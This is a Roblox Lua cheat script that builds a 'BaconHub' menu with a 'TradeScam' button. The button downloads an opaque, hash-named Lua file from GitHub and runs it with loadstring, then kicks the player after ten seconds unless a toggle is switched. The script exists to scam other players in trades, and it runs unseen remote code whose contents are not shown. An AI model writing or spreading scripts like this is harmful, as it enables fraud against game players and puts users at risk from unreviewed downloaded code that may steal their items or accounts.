local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({
    Name = "BaconHub",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest",
    Draggable = true
})
local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local isTradeScamClicked = false

Tab:AddButton({
    Name = "TradeScam",
    Callback = function()
        if not isTradeScamClicked then
            isTradeScamClicked = true
            loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/ee313b9e2cc73cdc95c434f5.lua'))()
            wait(10)
            if isTradeScamClicked then
                game.Players.LocalPlayer:Kick("You have been kicked for using TradeScam.")
            end
        end
    end
})

Tab:AddToggle({
    Name = "Turn off Tradescam",
    Default = false,
    Callback = function(value)
        isTradeScamClicked = not value
    end
})

OrionLib:Init()
